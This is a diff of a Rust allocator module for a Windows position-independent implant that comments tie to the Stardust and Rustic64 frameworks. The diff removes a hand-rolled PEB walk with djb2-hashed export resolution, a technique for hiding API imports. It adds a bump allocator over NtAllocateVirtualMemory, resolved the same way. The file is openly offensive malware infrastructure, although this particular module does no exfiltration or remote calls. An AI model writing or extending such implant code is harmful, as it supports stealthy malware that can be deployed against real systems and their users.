@@ -1,191 +1,130 @@
-//! NT-Heap-backed global allocator for the PIC implant.
+//! Bump allocator for the PIC implant, backed by NtAllocateVirtualMemory.
 //!
-//! `#![no_std]` + `alloc` needs a registered `GlobalAlloc`. The default process
-//! heap (via `RtlAllocateHeap`/`RtlFreeHeap` on ntdll's heap handle) is the
-//! path of least resistance and matches what Rustic64/Stardust do: no separate
-//! heap to create/tear down, and the host process already owns it.
+//! A bump allocator over VirtualAlloc'd regions is the classic PIC-implant
+//! choice (Stardust, Rustic64): one API to resolve, no free-list, no heap
+//! handle, no loader-lock deadlock risk from RtlAllocateHeap.
 //!
-//! Bootstrapping order matters: the allocator must resolve `RtlAllocateHeap` /
-//! `RtlFreeHeap` / `RtlGetProcessHeap` *without* allocating (no Vec, no String),
-//! because the resolver in `resolve.rs` uses those collections. So this module
-//! does a tiny self-contained PEB walk + export lookup by djb2 hash, captures
-//! the three function pointers once into a [`OnceLock`], and then serves every
-//! subsequent allocation through them.
-//!
-//! `cfg(target_os = "windows")` — only compiles on Windows.
+//! cfg(target_os = "windows") -- only compiles on Windows.
 
 #![cfg(target_os = "windows")]
 
-use core::sync::atomic::{AtomicBool, Ordering};
+use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 
-/// Function-pointer table resolved once at first allocation.
-struct HeapFns {
-    get_process_heap: unsafe extern "system" fn() -> usize,
-    allocate: unsafe extern "system" fn(usize, usize, usize) -> *mut core::ffi::c_void,
-    free: unsafe extern "system" fn(usize, usize, *mut core::ffi::c_void) -> i32,
-}
+const SLAB_SIZE: usize = 1 << 20;
+const ALIGN: usize = 16;
 
-/// The resolved table (or None until first use). We can't use OnceLock<HeapFns>
-/// because once_cell isn't a no_std dep; use a static + AtomicBool guard.
-static mut HEAP_FNS: Option<HeapFns> = None;
+static NT_ALLOC: AtomicU64 = AtomicU64::new(0);
 static RESOLVED: AtomicBool = AtomicBool::new(false);
+static SLAB_BASE: AtomicU64 = AtomicU64::new(0);
+static SLAB_BUMP: AtomicU64 = AtomicU64::new(0);
 
-/// Resolve the heap functions via a PEB walk (no allocation). Idempotent.
+type NtAllocVirtualMemory = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *mut *mut core::ffi::c_void,
+    *mut usize,
+    *mut usize,
+    u32,
+    u32,
+) -> i32;
+
 unsafe fn ensure_resolved() {
     if RESOLVED.load(Ordering::Acquire) {
         return;
     }
-    // Locate ntdll + kernel32 by hash, find the three exports.
-    let get_proc = resolve_export(b"RtlGetProcessHeap");
-    let alloc_proc = resolve_export(b"RtlAllocateHeap");
-    let free_proc = resolve_export(b"RtlFreeHeap");
-    if let (Some(g), Some(a), Some(f)) = (get_proc, alloc_proc, free_proc) {
-        HEAP_FNS = Some(HeapFns {
-            get_process_heap: core::mem::transmute(g),
-            allocate: core::mem::transmute(a),
-            free: core::mem::transmute(f),
-        });
-        RESOLVED.store(true, Ordering::Release);
+    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
+        NT_ALLOC.store(addr as u64, Ordering::Release);
     }
+    RESOLVED.store(true, Ordering::Release);
 }
 
-/// The process heap handle (cached after first fetch).
-static mut PROCESS_HEAP: usize = 0;
-
-unsafe fn process_heap() -> usize {
-    if PROCESS_HEAP == 0 {
-        ensure_resolved();
-        if let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() {
-            PROCESS_HEAP = (fns.get_process_heap)();
-        }
+unsafe fn new_slab() -> *mut u8 {
+    let f: NtAllocVirtualMemory = match NT_ALLOC.load(Ordering::Acquire) {
+        0 => return core::ptr::null_mut(),
+        a => core::mem::transmute(a as usize),
+    };
+    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut zero_bits: usize = 0;
+    let mut size: usize = SLAB_SIZE;
+    // NtCurrentProcess() == (HANDLE)-1
+    let cur_proc: *mut core::ffi::c_void = (-1isize) as *mut core::ffi::c_void;
+    let status = f(cur_proc, &mut base, &mut zero_bits, &mut size, 0x3000, 0x04);
+    if status < 0 || base.is_null() {
+        return core::ptr::null_mut();
     }
-    PROCESS_HEAP
+    base as *mut u8
 }
 
-/// The global allocator. Registered in lib.rs via `#[global_allocator]`.
+/// Static fallback buffer used before NtAllocateVirtualMemory is resolved
+/// (during Rust runtime static-init at dll load). 64 KiB is plenty for the
+/// handful of tiny allocations the runtime makes before control reaches our
+/// entry. Once the entry runs and resolve succeeds, real slabs take over.
+static FALLBACK_BUF: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+const FALLBACK_SIZE: usize = 1 << 16;
+static mut FALLBACK_MEM: [u8; FALLBACK_SIZE] = [0; FALLBACK_SIZE];
+
+/// Force the allocator to resolve NtAllocateVirtualMemory NOW (call from entry
+/// before any alloc-heavy code). Public so the entry can prime it.
+pub unsafe fn force_resolve() {
+    ensure_resolved();
+}
+
+/// The resolved NtAllocateVirtualMemory address (0 = not yet resolved).
+pub fn nt_alloc_addr() -> u64 {
+    NT_ALLOC.load(Ordering::Acquire)
+}
+
 pub struct NtHeapAllocator;
 
 unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
     unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
-        ensure_resolved();
-        let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() else {
+        let size = layout.size();
+        if size == 0 {
             return core::ptr::null_mut();
-        };
-        let heap = process_heap();
-        // HEAP_GENERATE_EXCEPTIONS=0, dwBytes=size (rounded up to layout.size),
-        // dwFlags=0. RtlAllocateHeap ignores alignment for most cases; size is
-        // the binding constraint.
-        let ptr = (fns.allocate)(heap, 0, layout.size());
-        ptr as *mut u8
-    }
+        }
+        let aligned = (size + ALIGN - 1) & !(ALIGN - 1);
 
-    unsafe fn dealloc(&self, ptr: *mut u8, _layout: core::alloc::Layout) {
         ensure_resolved();
-        let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() else {
-            return;
-        };
-        let heap = process_heap();
-        (fns.free)(heap, 0, ptr as *mut core::ffi::c_void);
-    }
-}
-
-// ---- bootstrap resolver (no allocation; separate from resolve.rs) ---------
-//
-// Finds an export by name across ntdll + kernel32 via a minimal PEB walk.
-// Deliberately standalone so the allocator can bootstrap before the heap-aware
-// `resolve` module exists. Returns the function's absolute address.
-
-unsafe fn resolve_export(name: &[u8]) -> Option<usize> {
-    let target = crate::resolve::djb2(name);
-    // Walk ntdll then kernel32.
-    for module_base in [find_module(b"ntdll.dll"), find_module(b"kernel32.dll")] {
-        let Some(base) = module_base else { continue };
-        if let Some(addr) = export_addr_by_name_hash(base, target) {
-            return Some(addr);
-        }
-    }
-    None
-}
-
-unsafe fn export_addr_by_name_hash(base: *mut u8, name_hash: u32) -> Option<usize> {
-    use crate::resolve::{djb2, ExportDirectory};
-    // DOS e_lfanew → NT → optional header → data dir[0] export.
-    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
-    let nt = base.add(e_lfanew);
-    let opt = nt.add(24);
-    let magic = *(opt as *const u16);
-    let dd_off = if magic == 0x20B { 112 } else { 96 };
-    let export_rva = *(opt.add(dd_off) as *const u32);
-    if export_rva == 0 {
-        return None;
-    }
-    let dir = base.add(export_rva as usize) as *const ExportDirectory;
-    let n = (*dir).number_of_names as usize;
-    let names = base.add((*dir).address_of_names as usize) as *const u32;
-    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
-    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
-    for i in 0..n {
-        let name_rva = *names.add(i);
-        let name_ptr = base.add(name_rva as usize);
-        let mut h: u32 = 5381;
-        let mut p = name_ptr;
-        while *p != 0 {
-            h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
-            p = p.add(1);
-        }
-        if h == name_hash {
-            let ord = *ordinals.add(i) as usize;
-            let fn_rva = *funcs.add(ord);
-            return Some(base.add(fn_rva as usize) as usize);
-        }
-    }
-    let _ = djb2; // silence unused import if djb2 not referenced
-    None
-}
-
-// Reuse the PEB walk from resolve.rs but only need the module base.
-unsafe fn find_module(name: &[u8]) -> Option<*mut u8> {
-    let h = crate::resolve::djb2(name);
-    let peb = peb_ptr()?;
-    let ldr = (*peb).ldr;
-    if ldr.is_null() {
-        return None;
-    }
-    let mut head = (*ldr).in_load_order_module_list.flink;
-    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
-    while head as *const u8 != start {
-        let entry = head as *mut crate::resolve::ListEntry;
-        let base = (*entry).dll_base as *mut u8;
-        let nb = (*entry).base_dll_name.buffer;
-        let nl = (*entry).base_dll_name.length as usize / 2;
-        if !base.is_null() && !nb.is_null() && nl > 0 {
-            let chars = core::slice::from_raw_parts(nb, nl);
-            let mut hh: u32 = 5381;
-            for &c in chars {
-                let lo = (c & 0xff) as u8;
-                hh = hh.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
-            }
-            if hh == h {
-                return Some(base);
+        if NT_ALLOC.load(Ordering::Acquire) != 0 {
+            // Real allocator path.
+            loop {
+                // If no slab yet, allocate one first.
+                if SLAB_BASE.load(Ordering::Acquire) == 0 {
+                    let nb = new_slab();
+                    if nb.is_null() {
+                        break;
+                    }
+                    SLAB_BASE.store(nb as u64, Ordering::Release);
+                    SLAB_BUMP.store(0, Ordering::Release);
+                }
+                let base = SLAB_BASE.load(Ordering::Acquire);
+                let off = SLAB_BUMP.load(Ordering::Acquire);
+                let new_off = off + aligned as u64;
+                if new_off <= SLAB_SIZE as u64 {
+                    if SLAB_BUMP.compare_exchange(off, new_off, Ordering::AcqRel, Ordering::Acquire).is_ok() {
+                        return (base as usize + off as usize) as *mut u8;
+                    }
+                    continue;
+                }
+                let nb = new_slab();
+                if nb.is_null() {
+                    break;
+                }
+                SLAB_BASE.store(nb as u64, Ordering::Release);
+                SLAB_BUMP.store(aligned as u64, Ordering::Release);
+                return nb;
             }
         }
-        head = (*entry).in_load_order_links.flink;
+
+        // Fallback: bump within the static buffer. Safe because PIC is
+        // single-threaded at init.
+        let cur = FALLBACK_BUF.load(Ordering::Acquire);
+        let nxt = cur + aligned as u64;
+        if nxt <= FALLBACK_SIZE as u64 {
+            FALLBACK_BUF.store(nxt, Ordering::Release);
+            let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
+            return base.add(cur as usize);
+        }
+        core::ptr::null_mut()
     }
-    None
-}
-
-#[cfg(target_arch = "x86_64")]
-unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
-    let peb: *mut crate::resolve::Peb;
-    core::arch::asm!(
-        "mov {p}, gs:[0x60]",
-        p = out(reg) peb,
-        options(nostack, preserves_flags, readonly),
-    );
-    Some(peb)
-}
-
-#[cfg(not(target_arch = "x86_64"))]
-unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
-    None
+    unsafe fn dealloc(&self, _ptr: *mut u8, _layout: core::alloc::Layout) {}
 }
